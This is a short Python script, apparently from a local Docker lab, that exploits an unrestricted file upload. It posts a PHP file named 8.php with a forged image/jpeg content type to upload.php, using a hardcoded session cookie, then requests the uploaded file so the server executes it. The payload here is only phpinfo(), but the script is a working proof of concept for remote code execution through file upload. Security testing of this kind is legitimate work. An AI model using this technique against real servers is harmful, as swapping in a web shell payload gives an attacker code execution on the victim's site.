import requests

session = requests.session()
# 登录以获取最新cookie



# 端口以docker为准，这里使用8088
burp0_url = "http://127.0.0.1:8088/php/upload.php"

burp0_cookies = {"loggedInUser": "diemandcarpe", "PHPSESSID": "ujkv3jne6i6ek8fhr01b43pt7i"}
burp0_headers = {"Cache-Control": "max-age=0", "sec-ch-ua": "\"Chromium\";v=\"103\", \".Not/A)Brand\";v=\"99\"", "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": "\"Windows\"", "Upgrade-Insecure-Requests": "1", "Origin": "http://127.0.0.1:8088", "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryOxiA2lVzEU0Y5hoF", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Referer": "http://127.0.0.1:8088/php/home.php", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close"}
burp0_data = "------WebKitFormBoundaryOxiA2lVzEU0Y5hoF\r\nContent-Disposition: form-data; name=\"file\"; filename=\"8.php\"\r\nContent-Type: image/jpeg\r\n\r\n<?php\r\nphpinfo()\r\n?>\r\n------WebKitFormBoundaryOxiA2lVzEU0Y5hoF\r\nContent-Disposition: form-data; name=\"private\"\r\n\r\n0\r\n------WebKitFormBoundaryOxiA2lVzEU0Y5hoF--\r\n"
r = session.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)
session.close

session = requests.session()
url = 'http://127.0.0.1:8088/image/diemandcarpe/8.php'  # 网站地址
r = session.get(url)
print(r.text)
